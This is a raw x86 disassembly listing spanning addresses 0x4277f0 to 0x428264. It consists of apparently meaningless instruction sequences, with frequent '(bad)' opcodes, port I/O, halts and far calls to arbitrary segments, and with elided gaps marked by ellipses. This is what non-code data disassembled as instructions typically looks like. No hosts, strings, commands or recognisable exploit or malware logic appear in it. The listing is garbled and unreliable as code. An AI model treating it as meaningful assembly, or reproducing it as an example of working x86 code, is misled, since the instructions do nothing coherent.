  4277f0:	xor    eax,0x5c2a5fbb
  4277f5:	ror    cl,1
  4277f7:	in     al,dx
  4277f8:	inc    ebp
  4277f9:	iret   
  4277fa:	push   ss
  4277fb:	dec    edi
  4277fc:	jl     0x427802
  4277fe:	sti    
  4277ff:	sbb    cl,BYTE PTR [edx-0x64eb1298]
  427805:	dec    ecx
  427806:	jmp    DWORD PTR [edx+0x31]
  427809:	movq   mm7,QWORD PTR [ebp+ebx*1+0x7b43a9]
	...
  427871:	add    BYTE PTR [eax],al
  427873:	add    BYTE PTR [edx],bl
  427875:	mov    cl,BYTE PTR [ebx]
  427877:	inc    ebp
  427878:	fwait
  427879:	lds    ebx,FWORD PTR [esi-0x21]
  42787c:	jo     0x4278e3
  42787e:	fldl2e 
  427880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427882:	push   ebp
  427883:	call   0x104:0x1a620
  42788a:	add    BYTE PTR [eax],al
  42788c:	sub    al,0x78
  42788e:	lahf   
  42788f:	aam    0xa2
  427891:	jmp    0x96d46bf2
  427896:	mov    ch,0xe6
  427898:	bndldx bnd0,[eax-0x75]
  42789c:	pop    ds
  42789d:	sahf   
  42789e:	test   eax,0x2b04be4b
  4278a3:	sbb    DWORD PTR [edx],ebx
  4278a5:	dec    edx
  4278a6:	jae    0x427888
  4278a8:	aad    0x3
  4278aa:	add    al,0xe
  4278ac:	js     0x4278da
  4278ae:	ins    DWORD PTR es:[edi],dx
  4278af:	mov    bh,0xf8
  4278b1:	pop    ebp
  4278b2:	mov    ebx,0xca647572
  4278b7:	mov    ah,0xa7
  4278b9:	in     al,0x9
  4278bb:	sbb    al,0xb
  4278bd:	add    al,0xf7
  4278bf:	ret    0x65d7
  4278c2:	jle    0x42784f
  4278c4:	sahf   
  4278c5:	sar    BYTE PTR [ebp+0x3b],1
  4278c8:	hlt    
  4278c9:	jmp    FWORD PTR [ecx+0x26d3cce6]
  4278cf:	push   eax
  4278d0:	in     al,0xf8
  4278d2:	push   esi
  4278d3:	ror    BYTE PTR [eax-0x47582540],0x42
  4278da:	mov    ds:0xa5eb179a,eax
  4278df:	jo     0x4278a4
  4278e1:	imul   eax,DWORD PTR [esi],0x46
  4278e4:	jb     0x427959
  4278e6:	aad    0x4d
  4278e8:	jp     0x427929
  4278ea:	or     bh,BYTE PTR [eax+0x2e]
  4278ed:	int    0x32
  4278ef:	add    eax,0xfb87ef2e
  4278f4:	(bad)  
  4278f5:	in     al,0x81
  4278f7:	ret    
  4278f8:	sub    dl,BYTE PTR [ebx+ecx*1]
  4278fb:	sub    BYTE PTR [edx],0x46
  4278fe:	out    0xf6,eax
  427900:	mov    ds:0xc516c1c9,eax
  427905:	push   edx
  427906:	mov    ah,0xa3
  427908:	push   edx
  427909:	imul   ebp,ebp,0x1660a90f
  42790f:	or     ecx,DWORD PTR [ecx+0x5d]
  427912:	jns    0x42792d
  427914:	sub    DWORD PTR [eax-0x46f76e23],eax
  42791a:	xchg   esi,eax
  42791b:	mov    ebp,0xd3f2f135
  427920:	loop   0x4278c6
  427922:	in     eax,0xe3
  427924:	test   esi,edi
  427926:	xor    ebp,DWORD PTR [ebx]
  427928:	jo     0x427923
  42792a:	jno    0x427963
  42792c:	aas    
  42792d:	pop    esi
  42792e:	scas   al,BYTE PTR es:[edi]
  42792f:	mov    edx,0xcf1419f1
  427934:	push   eax
  427935:	xchg   BYTE PTR [edx+0x21abcd59],ch
  42793b:	inc    ebp
  42793c:	xchg   ebx,eax
  42793d:	sar    DWORD PTR [edi+0x45],1
  427940:	loope  0x4279b5
  427942:	mov    esi,0xfe6a6872
  427947:	ret    0x38b8
  42794a:	hlt    
  42794b:	mov    ds:0x5b7d82d8,eax
  427950:	test   al,0x3
  427952:	xchg   BYTE PTR [ecx+0x3f],dh
  427955:	pop    ebp
  427956:	call   0x8d07:0x81176629
  42795d:	in     al,dx
  42795e:	mov    esi,0x8e793fa1
  427963:	and    bl,BYTE PTR [ebp-0x78]
  427966:	jge    0x4279af
  427968:	dec    esi
  427969:	mov    ecx,0xbfb2d019
  42796e:	out    0x25,eax
  427970:	hlt    
  427971:	rcr    DWORD PTR [eax-0x6c],cl
  427974:	mov    DWORD PTR [ebx-0x44b1d5c4],ecx
  42797a:	test   eax,0x69b82a38
  42797f:	and    esi,eax
  427981:	mov    esi,ecx
  427983:	mov    bl,0x2d
  427985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427986:	div    DWORD PTR [edi-0x5a]
  427989:	arpl   WORD PTR [edi],dx
  42798b:	push   ebp
  42798c:	xchg   esp,eax
  42798d:	pop    es
  42798e:	ins    BYTE PTR es:[edi],dx
  42798f:	inc    ecx
	...
  4279f4:	call   0xdea3:0xffa3ffdd
  4279fb:	std    
  4279fc:	inc    edx
  4279fd:	jne    0x4279d7
  4279ff:	xor    DWORD PTR [edi],0x2a
  427a02:	adc    dl,BYTE PTR [edx+0x24]
  427a05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a06:	add    DWORD PTR [eax],eax
  427a08:	add    al,0x1
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	dec    ecx
  427a0d:	test   al,0x44
  427a0f:	out    0x83,eax
  427a11:	xor    cl,dl
  427a13:	cld    
  427a14:	mov    al,0x82
  427a16:	adc    DWORD PTR [edx-0x6b],ecx
  427a19:	inc    esp
  427a1a:	jno    0x427a5f
  427a1c:	ret    0xf877
  427a1f:	inc    eax
  427a20:	xchg   DWORD PTR [esi+0x27ace948],eax
  427a26:	imul   esp,DWORD PTR [edi],0x3ff3b14c
  427a2c:	mov    ecx,0xa44172c3
  427a31:	sbb    bh,al
  427a33:	inc    ebp
  427a34:	(bad)
  427a37:	sbb    BYTE PTR [edi-0x4801e32e],0xcc
  427a3e:	and    dl,BYTE PTR [edx]
  427a40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a41:	retf   
  427a42:	xlat   BYTE PTR ds:[ebx]
  427a43:	lock int3 
  427a45:	and    DWORD PTR [ebp+0x682eb020],edx
  427a4b:	xor    DWORD PTR [ecx-0x2],0x38
  427a4f:	jne    0x427aa2
  427a51:	add    BYTE PTR [esi+0x8],0xfe
  427a55:	cmp    ebx,DWORD PTR [eax]
  427a57:	call   0xbe1d:0xaef8061b
  427a5e:	les    ebp,FWORD PTR gs:[edx]
  427a61:	in     al,0x36
  427a63:	rcl    esi,0x23
  427a66:	add    eax,0xb2a72f3b
  427a6b:	js     0x427abb
  427a6d:	aam    0xa3
  427a6f:	ja     0x427a1e
  427a71:	mov    bh,bl
  427a73:	jbe    0x427a32
  427a75:	or     eax,0x6ddfd20a
  427a7a:	mov    al,ds:0x1631a5b
  427a7f:	xchg   edi,eax
  427a81:	xor    edi,edx
  427a83:	rcl    DWORD PTR [edi+0x669fde46],1
  427a89:	in     eax,dx
  427a8a:	jne    0x427a5c
  427a8c:	ja     0x427b06
  427a8e:	mov    esp,0x5a3ed6f9
  427a93:	mov    al,ds:0xe8856814
  427a98:	adc    esi,edx
  427a9a:	push   esp
  427a9b:	inc    ebx
  427a9c:	ror    DWORD PTR fs:[edx],1
  427a9f:	dec    edi
  427aa0:	(bad)  
  427aa1:	enter  0x7815,0x81
  427aa5:	ins    BYTE PTR es:[edi],dx
  427aa6:	or     eax,0xb0436a7f
  427aab:	adc    DWORD PTR [eax],ecx
  427aad:	stc    
  427aae:	pop    eax
  427aaf:	shr    DWORD PTR [ebx+0x34],1
  427ab2:	ret    0x69fe
  427ab5:	xor    BYTE PTR [ebx-0x76],bh
  427ab8:	leave  
  427ab9:	push   edi
  427aba:	in     al,0xbd
  427abc:	inc    eax
  427abd:	adc    dl,BYTE PTR [edi-0x7cb95cf3]
  427ac3:	jmp    0xe493:0x97b5a955
  427aca:	jle    0x427ab6
  427acc:	loop   0x427b42
  427ace:	xchg   BYTE PTR [ebx],dh
  427ad0:	jne    0x427b3e
  427ad2:	cmp    edx,DWORD PTR [edi+eiz*1+0x78dc11ec]
  427ad9:	sbb    ah,BYTE PTR [esi-0x35ef3684]
  427adf:	and    DWORD PTR [eax+esi*4],ebx
  427ae2:	imul   ecx,DWORD PTR ds:0x9d1740aa,0xedf9b6b3
  427aec:	mov    edx,0x9bb4a240
  427af1:	mov    edx,0x26bd51ba
  427af6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427af7:	xor    esi,DWORD PTR [ecx]
  427af9:	imul   ebx,DWORD PTR [edx+0x49],0x713631d8
  427b00:	lods   al,BYTE PTR ds:[esi]
  427b01:	fdivr  QWORD PTR [ecx-0x13ed7f4c]
  427b07:	lahf   
  427b08:	or     edx,DWORD PTR [edx+0x6d0aceed]
  427b0e:	inc    esi
  427b0f:	push   ebp
	...
  427b74:	retf   0x528b
  427b77:	jnp    0x427bcc
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	imul   BYTE PTR [edi+0x28042912]
  427b85:	test   al,0x1
  427b87:	add    BYTE PTR [ecx+eax*1],al
  427b8a:	add    BYTE PTR [eax],al
  427b8c:	pop    ecx
  427b8d:	ds cli 
  427b8f:	lock scas eax,DWORD PTR es:[edi]
  427b91:	loop   0x427b44
  427b93:	out    dx,al
  427b94:	out    dx,al
  427b95:	mov    BYTE PTR [ebp-0x3b4f01a8],bl
  427b9b:	lea    edx,es:[ebx+0x44265c28]
  427ba2:	(bad)  
  427ba3:	loop   0x427c00
  427ba5:	add    ebp,DWORD PTR [ecx-0x7c]
  427ba8:	(bad)  
  427ba9:	rcr    bl,0xb2
  427bac:	adc    edx,DWORD PTR [ebx-0x3f7cdfba]
  427bb2:	or     al,0x98
  427bb4:	daa    
  427bb5:	aam    0x22
  427bb7:	pop    es
  427bb8:	add    eax,0xaeddb348
  427bbd:	push   es
  427bbe:	loop   0x427b7a
  427bc0:	cwde   
  427bc1:	outs   dx,BYTE PTR ds:[esi]
  427bc2:	ins    BYTE PTR es:[edi],dx
  427bc3:	xchg   edi,eax
  427bc4:	inc    ebp
  427bc5:	test   dl,ch
  427bc7:	xlat   BYTE PTR ds:[ebx]
  427bc8:	sbb    eax,0x19b662da
  427bcd:	sub    eax,0xca6a582e
  427bd2:	imul   ecx,DWORD PTR [edx],0x6d774e6d
  427bd8:	fcom   DWORD PTR ds:0xaa559f5a
  427bde:	push   edx
  427bdf:	jecxz  0x427c4b
  427be1:	pop    ecx
  427be2:	sbb    eax,esp
  427be4:	test   eax,0x83b37ecf
  427be9:	stos   BYTE PTR es:[edi],al
  427bea:	mov    cl,0xbf
  427bec:	and    ah,BYTE PTR [edi]
  427bee:	push   ds
  427bef:	jns    0x427bbd
  427bf1:	ja     0x427bce
  427bf3:	sub    bl,ch
  427bf5:	fisub  DWORD PTR [esi-0x4a]
  427bf8:	(bad)  
  427bf9:	dec    ecx
  427bfa:	int3   
  427bfb:	fsubr  DWORD PTR [eax+0x73]
  427bfe:	int    0x50
  427c00:	adc    eax,0x5552e0ab
  427c05:	scas   eax,DWORD PTR es:[edi]
  427c06:	mov    ecx,0x3bab13a5
  427c0b:	lds    edi,FWORD PTR [ecx]
  427c0d:	pusha  
  427c0e:	pop    edi
  427c0f:	dec    ebx
  427c10:	pop    edi
  427c11:	xor    bh,ah
  427c13:	das    
  427c14:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c16:	clc    
  427c17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c18:	aaa    
  427c19:	ret    
  427c1a:	push   ecx
  427c1b:	inc    ebp
  427c1c:	sbb    eax,0xc1231858
  427c21:	or     BYTE PTR [edx+esi*4-0x4d],ah
  427c25:	xchg   esi,esi
  427c27:	imul   esp,DWORD PTR [edx],0x566220ec
  427c2d:	cmp    ecx,edx
  427c2f:	cwde   
  427c30:	jo     0x427c13
  427c32:	cmp    eax,0x94cdd417
  427c37:	sti    
  427c38:	jmp    0xe40dbddb
  427c3d:	and    eax,eax
  427c3f:	test   al,0x1a
  427c41:	mov    eax,0x5dafffa0
  427c46:	mov    ch,0x2e
  427c48:	and    al,BYTE PTR [ebx]
  427c4a:	inc    ecx
  427c4b:	in     eax,dx
  427c4c:	mov    dh,0xbc
  427c4e:	pusha  
  427c4f:	pop    ss
  427c50:	div    BYTE PTR [edx-0x7f]
  427c53:	or     eax,0x5e127f5a
  427c58:	mov    ds:0xd5406341,al
  427c5d:	mov    ch,BYTE PTR [ebp-0x270e054a]
  427c63:	outs   dx,DWORD PTR ds:[esi]
  427c64:	or     dh,BYTE PTR es:[ecx-0x4fcd70aa]
  427c6b:	fldenv [esi+0x3b]
  427c6e:	out    dx,eax
  427c6f:	out    0xd5,eax
  427c71:	mov    esi,0x7e95a300
  427c76:	or     esi,ebx
  427c78:	sub    edi,DWORD PTR [ebx]
  427c7a:	call   0x2e94fc6a
  427c7f:	jp     0x427cc6
  427c81:	cmp    ah,BYTE PTR [eax-0x4e]
  427c84:	iret   
  427c85:	sub    esp,DWORD PTR [bx-0x4b7f]
  427c8a:	xor    al,0xc0
  427c8c:	mov    ds:0x9d7736,al
	...
  427cf1:	add    BYTE PTR [eax],al
  427cf3:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0x3bd65d44,ebx
  427d02:	push   edi
  427d03:	les    ebp,FWORD PTR [ecx+ebp*4]
  427d06:	add    DWORD PTR [eax],eax
  427d08:	add    al,0x1
  427d0a:	add    BYTE PTR [eax],al
  427d0c:	fs xor dh,ch
  427d0f:	ins    BYTE PTR es:[edi],dx
  427d10:	(bad)  
  427d11:	fwait
  427d12:	xor    dh,al
  427d14:	jo     0x427d6e
  427d16:	and    eax,0x109c268
  427d1b:	add    al,0x65
  427d1d:	xchg   esp,eax
  427d1e:	add    cl,dh
  427d20:	xchg   ecx,eax
  427d21:	inc    ecx
  427d22:	cmp    ch,BYTE PTR [esi-0x67fc86a6]
  427d28:	retf   0x7fff
  427d2b:	xchg   ebp,eax
  427d2c:	push   cs
  427d2d:	ins    DWORD PTR es:[edi],dx
  427d2e:	fdivr  DWORD PTR [edx]
  427d30:	xor    BYTE PTR [ebp+0x6],ah
  427d33:	shl    BYTE PTR [edx],1
  427d35:	fisub  DWORD PTR [esi+0x1e]
  427d38:	fdiv   st,st(5)
  427d3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d3b:	retf   0x7da
  427d3e:	aas    
  427d3f:	mov    bl,0x6f
  427d41:	inc    ecx
  427d42:	loope  0x427d65
  427d44:	call   0x3341:0x5bdfbc21
  427d4b:	adc    al,0xa3
  427d4d:	cld    
  427d4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d4f:	fadd   QWORD PTR [esi]
  427d51:	push   edi
  427d52:	mov    ds:0x97804f68,al
  427d57:	cwde   
  427d58:	mov    edi,DWORD PTR [esi-0x66]
  427d5b:	in     al,0xaf
  427d5d:	mov    ecx,0x4bf02eeb
  427d62:	shl    ah,1
  427d64:	cmc    
  427d65:	in     eax,0xde
  427d67:	sbb    DWORD PTR [edi+0x1fd3ac72],edi
  427d6d:	scas   al,BYTE PTR es:[edi]
  427d6e:	push   edx
  427d6f:	mov    cl,0xaf
  427d71:	jp     0x427d33
  427d73:	mov    dl,0x1d
  427d75:	leave  
  427d76:	ror    DWORD PTR [esp+eax*4+0x28534cb3],1
  427d7d:	in     al,0x8e
  427d7f:	pop    es
  427d80:	addr16 mov cl,0x4e
  427d83:	mov    esi,0xc707986a
  427d88:	shr    DWORD PTR [edx+edx*8-0x46be7ead],cl
  427d8f:	push   ds
  427d90:	fist   WORD PTR [ecx+0x10b5c6cf]
  427d96:	mov    ebx,0x5058247b
  427d9b:	xchg   ecx,eax
  427d9c:	inc    eax
  427d9d:	pushf  
  427d9e:	retf   
  427d9f:	jne    0x427dec
  427da1:	jo     0x427d89
  427da3:	mov    esi,0xf698a568
  427da8:	xchg   ebp,eax
  427da9:	(bad)  
  427daa:	cmp    dl,BYTE PTR [edx+0xf29a975]
  427db0:	mov    eax,0x9e7d0f96
  427db5:	cmp    al,0x3d
  427db7:	enter  0xd709,0xa5
  427dbb:	in     eax,dx
  427dbc:	jl     0x427d8d
  427dbe:	pop    es
  427dbf:	sub    BYTE PTR [edx],ah
  427dc1:	sbb    al,BYTE PTR [esi-0x3c]
  427dc4:	jb     0x427e2f
  427dc6:	out    0x75,eax
  427dc8:	mov    eax,0xf5f589dc
  427dcd:	mov    ecx,0xa3e88cad
  427dd2:	(bad)  
  427dd3:	cmc    
  427dd4:	and    BYTE PTR [edi+0x20],bh
  427dd7:	pushf  
  427dd8:	adc    al,0x8d
  427dda:	lock sbb BYTE PTR [ebx],bh
  427ddd:	push   esp
  427dde:	pushf  
  427ddf:	sbb    eax,0xef224c7e
  427de4:	(bad)  
  427de5:	stos   DWORD PTR es:[edi],eax
  427de6:	inc    edx
  427de7:	out    0xfc,al
  427de9:	retf   
  427dea:	cwde   
  427deb:	cld    
  427dec:	xchg   ebx,eax
  427ded:	mov    ebx,0x1e7e35c4
  427df2:	aam    0x14
  427df4:	mov    ecx,0xdc0ba89d
  427df9:	mov    dl,0x91
  427dfb:	pop    esp
  427dfc:	mov    dh,0xf8
  427dfe:	xor    al,0x41
  427e00:	imul   BYTE PTR [edi-0x4a77e84c]
  427e06:	lea    ebp,[esi-0x3a]
  427e09:	add    eax,DWORD PTR [ebp+0x36]
  427e0c:	rol    dh,0xc0
  427e0f:	ja     0x427e11
	...
  427e71:	add    BYTE PTR [eax],al
  427e73:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	fmul   st(6),st
  427e82:	aad    0x9c
  427e84:	xor    BYTE PTR [edx+0x1040001],ch
  427e8a:	add    BYTE PTR [eax],al
  427e8c:	mov    ebx,DWORD PTR [ecx+0x480985fe]
  427e92:	push   ds
  427e93:	jno    0x427ecb
  427e95:	aad    0xec
  427e97:	xchg   esi,eax
  427e98:	fisttp DWORD PTR ds:0x86ccef08
  427e9e:	jo     0x427edc
  427ea0:	xor    eax,0x4599c05f
  427ea5:	retf   0xf6dc
  427ea8:	jg     0x427e47
  427eaa:	add    ch,ch
  427eac:	pop    ds
  427ead:	lock and al,0x73
  427eb0:	inc    ebx
  427eb1:	pushf  
  427eb2:	ins    DWORD PTR es:[edi],dx
  427eb3:	ds (bad) 
  427eb5:	mov    ebx,0x834fbbdd
  427eba:	adc    DWORD PTR [esi-0x4462bfe4],edi
  427ec0:	rol    ebp,1
  427ec2:	add    al,0x7b
  427ec4:	jae    0x427f08
  427ec6:	and    edx,DWORD PTR [ebx+esi*8+0x5119219e]
  427ecd:	test   DWORD PTR ds:0xf15946cf,esi
  427ed3:	ret    
  427ed4:	addr16 (bad) 
  427ed6:	(bad)  
  427ed7:	jo     0x427f3b
  427ed9:	loopne 0x427e8a
  427edb:	xchg   edi,eax
  427edc:	ins    DWORD PTR es:[edi],dx
  427edd:	xchg   ebx,eax
  427ede:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427edf:	cmp    esp,DWORD PTR [ebx+edx*1]
  427ee2:	xchg   ecx,eax
  427ee3:	mov    edi,0x927f4944
  427ee8:	push   ss
  427ee9:	jno    0x427eac
  427eeb:	retf   
  427eec:	xor    al,0x48
  427eee:	out    0x41,al
  427ef0:	stc    
  427ef1:	cwde   
  427ef2:	mov    ds:0x9e942463,al
  427ef7:	imul   ebx,esp,0x3ab82baf
  427efd:	mov    dh,0x55
  427eff:	jle    0x427f1b
  427f01:	ss push ebx
  427f03:	mov    esp,0x5a9653f1
  427f08:	xchg   BYTE PTR [edi-0x45],bl
  427f0b:	sbb    edi,0x2a3ae00e
  427f11:	lods   al,BYTE PTR fs:[esi]
  427f13:	into   
  427f14:	daa    
  427f15:	bound  ebp,QWORD PTR [eax-0x1ace1f7a]
  427f1b:	pop    esi
  427f1c:	xchg   edi,eax
  427f1d:	sahf   
  427f1e:	add    eax,0x7b46c0c
  427f23:	sub    BYTE PTR [eax+0x50],ah
  427f26:	pop    esp
  427f27:	adc    ecx,DWORD PTR [ecx+0x6954f3f6]
  427f2d:	ror    BYTE PTR [ecx+ebx*8+0x3b],cl
  427f31:	ins    BYTE PTR es:[edi],dx
  427f32:	clc    
  427f33:	fild   WORD PTR [esi]
  427f35:	jp     0x427ee8
  427f37:	push   ecx
  427f38:	or     al,0xbb
  427f3a:	popa   
  427f3b:	popa   
  427f3c:	pusha  
  427f3d:	(bad)  
  427f3f:	pop    edi
  427f40:	(bad)  
  427f42:	imul   ebp,DWORD PTR [edi+0x22],0x8d553cf3
  427f49:	inc    ecx
  427f4a:	les    eax,FWORD PTR [ecx-0x70]
  427f4d:	adc    esp,DWORD PTR [esi+0x276e47b0]
  427f53:	mov    al,0xa5
  427f55:	mov    eax,0x72777620
  427f5a:	dec    eax
  427f5b:	or     eax,0x387e2759
  427f60:	shl    DWORD PTR [edi+0x2e],cl
  427f63:	rcl    BYTE PTR [edi-0x182f1e85],cl
  427f69:	or     eax,0xa38e5cd6
  427f6e:	fist   WORD PTR [ecx+0x4afd737f]
  427f74:	add    edi,DWORD PTR ds:0x8f4855ee
  427f7a:	and    al,0x49
  427f7c:	test   edi,0x9a2faec5
  427f82:	push   ebx
  427f83:	outs   dx,DWORD PTR ds:[esi]
  427f84:	in     eax,dx
  427f85:	push   eax
  427f86:	in     al,0xbc
  427f88:	sub    al,0x67
  427f8a:	push   0xffffffb1
  427f8c:	sbb    al,0x24
  427f8e:	sbb    BYTE PTR [eax+eax*1+0x0],dl
	...
  427ff2:	add    BYTE PTR [eax],al
  427ff4:	mov    cl,0xa7
  427ff6:	dec    ebx
  427ff7:	das    
  427ff8:	pop    edi
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	clc    
  428001:	inc    esi
  428002:	inc    ebx
  428003:	xchg   edx,eax
  428004:	xor    al,0xab
  428006:	add    DWORD PTR [eax],eax
  428008:	add    al,0x1
  42800a:	add    BYTE PTR [eax],al
  42800c:	out    dx,eax
  42800d:	mov    edi,0x17821205
  428012:	jns    0x428015
  428014:	mov    edx,0xc9691e42
  428019:	xchg   ebx,eax
  42801a:	sub    al,0x2
  42801c:	add    BYTE PTR [edx+edx*1],bh
  42801f:	out    dx,al
  428020:	dec    ebp
  428021:	stos   DWORD PTR es:[edi],eax
  428022:	push   edx
  428023:	add    edi,esp
  428025:	fiadd  WORD PTR [ecx-0xc66bfba]
  42802b:	aad    0x13
  42802d:	in     al,0x17
  42802f:	cs sahf 
  428031:	or     al,0x6d
  428033:	dec    edi
  428034:	mov    cl,0xe3
  428036:	clc    
  428037:	pop    edi
  428038:	push   0x2ae57414
  42803d:	jl     0x4280b1
  42803f:	dec    eax
  428040:	aam    0xeb
  428042:	sbb    BYTE PTR [eax+0x5],bl
  428045:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428046:	fnstenv [ebx-0x33846fa9]
  42804c:	push   ecx
  42804d:	adc    DWORD PTR [ebx+edi*1+0x2764f5a1],0xc6ab4883
  428058:	sub    eax,0x8bcea094
  42805d:	push   edx
  42805e:	(bad)  
  42805f:	cmp    eax,DWORD PTR [ecx+0x2bd1eaa4]
  428065:	std    
  428066:	lahf   
  428067:	dec    ecx
  428068:	jl     0x42803c
  42806a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42806b:	push   cs
  42806c:	jnp    0x428037
  42806e:	hlt    
  42806f:	ins    BYTE PTR es:[edi],dx
  428070:	retf   0xe39f
  428073:	mov    ds:0x19686437,al
  428078:	int3   
  428079:	mov    esp,0x1c875ffd
  42807e:	mov    dh,0x41
  428080:	or     DWORD PTR [eax+ecx*4+0x6d8ceb54],0x6d
  428088:	pop    ss
  428089:	out    0xc5,al
  42808b:	loop   0x428042
  42808d:	fild   WORD PTR [ebx+0x4c139f82]
  428093:	jns    0x4280a2
  428095:	imul   esi,edx,0x35
  428098:	aam    0xd6
  42809a:	xchg   edi,eax
  42809b:	and    DWORD PTR [esi-0x6893a2ca],esi
  4280a1:	mov    ds:0x139fff75,al
  4280a6:	jecxz  0x42803f
  4280a8:	shr    ch,cl
  4280aa:	xchg   ebp,eax
  4280ab:	pop    edx
  4280ac:	js     0x4280aa
  4280ae:	adc    BYTE PTR [ebp+0x7e],ah
  4280b1:	jge    0x4280b8
  4280b3:	outs   dx,DWORD PTR ds:[esi]
  4280b4:	inc    edx
  4280b5:	push   0x9a88a5d
  4280ba:	imul   edx,DWORD PTR [ebx-0x682a4c44],0x4
  4280c1:	sub    ebx,DWORD PTR [ebx+0x76]
  4280c4:	jecxz  0x4280d6
  4280c6:	lock xor eax,DWORD PTR [ebx+0x30]
  4280ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280cb:	pop    es
  4280cc:	and    eax,0x9564450f
  4280d1:	pop    ecx
  4280d2:	cli    
  4280d3:	(bad)  [edx]
  4280d5:	cmp    al,0x3e
  4280d7:	mov    ah,0x79
  4280d9:	xor    bl,bl
  4280db:	jmp    0x428155
  4280dd:	lahf   
  4280de:	in     eax,0xba
  4280e0:	dec    eax
  4280e1:	sub    al,0x8b
  4280e3:	mov    ebp,0x1932c370
  4280e8:	das    
  4280e9:	ss ins DWORD PTR es:[edi],dx
  4280eb:	scas   eax,DWORD PTR es:[edi]
  4280ec:	pop    ecx
  4280ed:	sub    DWORD PTR [eax+0x5cab73c2],ebx
  4280f3:	repnz add dl,ah
  4280f6:	inc    ecx
  4280f7:	push   esp
  4280f8:	mov    edx,0xc64db413
  4280fd:	sbb    DWORD PTR [ebx-0x7],ebx
  428100:	shr    DWORD PTR [ecx+0x2cf3adf],1
  428106:	inc    ebp
  428107:	xchg   ebp,eax
  428108:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428109:	and    eax,0xb4a1174c
  42810e:	shr    BYTE PTR [edi+0x0],1
	...
  428174:	fucomip st,st(6)
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	(bad)  
  428181:	shl    BYTE PTR [ecx+0x1ac38ea],cl
  428187:	add    BYTE PTR [ecx+eax*1],al
  42818a:	add    BYTE PTR [eax],al
  42818c:	pop    ss
  42818d:	mov    ds:0x9c04d890,al
  428192:	or     al,0x2a
  428194:	xchg   ebx,eax
  428195:	test   eax,0x4b2e2c8c
  42819a:	mov    edx,0xd8fee5bb
  42819f:	fiadd  WORD PTR [ebx]
  4281a1:	sub    DWORD PTR [eax+0x63e98a04],eax
  4281a7:	popa   
  4281a8:	xchg   WORD PTR ds:0xdb10ef97,dx
  4281af:	push   ebp
  4281b0:	ins    DWORD PTR es:[edi],dx
  4281b1:	daa    
  4281b2:	mov    esp,0x9dbd33ae
  4281b7:	ins    DWORD PTR es:[edi],dx
  4281b8:	(bad)  [ecx-0x1]
  4281bb:	sti    
  4281bc:	aas    
  4281bd:	js     0x428149
  4281bf:	icebp  
  4281c0:	jle    0x42815b
  4281c2:	fst    QWORD PTR [edi+ebp*4+0x65]
  4281c6:	pop    ss
  4281c7:	das    
  4281c8:	xchg   edi,eax
  4281c9:	les    eax,FWORD PTR [edx-0x24]
  4281cc:	fild   QWORD PTR [ebx+ecx*2-0xeeb7b72]
  4281d3:	sub    esp,DWORD PTR [ebp-0x75]
  4281d6:	fistp  QWORD PTR [eax-0x35ab140e]
  4281dc:	call   0xbac:0x4a39f302
  4281e3:	jo     0x428257
  4281e5:	in     al,0xbd
  4281e7:	outs   dx,BYTE PTR ds:[esi]
  4281e8:	inc    edx
  4281e9:	out    0x4d,al
  4281eb:	(bad)  
  4281ec:	stos   DWORD PTR es:[edi],eax
  4281ed:	and    edi,DWORD PTR [eax]
  4281ef:	push   0xd0d7343b
  4281f4:	sbb    BYTE PTR [esi+0x45],bh
  4281f7:	mov    bh,0x3e
  4281f9:	sub    esi,DWORD PTR [eax]
  4281fb:	and    DWORD PTR [edi],ebp
  4281fd:	mov    al,ds:0xd5c0684f
  428202:	cwde   
  428203:	js     0x4281a7
  428205:	pop    ecx
  428206:	pushf  
  428207:	loope  0x4281fc
  428209:	aad    0xe4
  42820b:	lods   al,BYTE PTR ds:[esi]
  42820c:	jne    0x428191
  42820e:	sbb    DWORD PTR ds:0x2356ff71,edx
  428214:	scas   al,BYTE PTR es:[edi]
  428215:	inc    ebp
  428216:	lods   eax,DWORD PTR ds:[esi]
  428217:	mov    dl,0x15
  428219:	push   esi
  42821a:	ins    DWORD PTR es:[edi],dx
  42821b:	pop    edi
  42821c:	or     bh,cl
  42821e:	out    0x40,eax
  428220:	xor    BYTE PTR [esi+0x4b],0x57
  428224:	(bad)  
  428225:	mov    dh,0x65
  428227:	or     bh,BYTE PTR [edi-0x742ba2a]
  42822d:	nop
  42822e:	sbb    esp,ebx
  428230:	sbb    BYTE PTR ds:0x4d388d38,dh
  428236:	xor    DWORD PTR [esi+eax*8-0x5c],0xffffffd7
  42823b:	mov    cs,WORD PTR [edx-0x5b7c7692]
  428241:	mov    esp,0x3a8ff234
  428246:	outs   dx,DWORD PTR ds:[esi]
  428247:	and    al,0x7
  428249:	shr    BYTE PTR [edx],1
  42824b:	mov    ds:0xc2eb4eed,al
  428250:	push   0xe16a03cb
  428255:	sub    ecx,esp
  428257:	push   ebx
  428258:	jo     0x428211
  42825a:	(bad)  
  42825b:	ror    DWORD PTR [esi-0x7d49b533],cl
  428261:	pushf  
  428262:	mov    bh,0xc7
  428264:	loopne 0x42828c
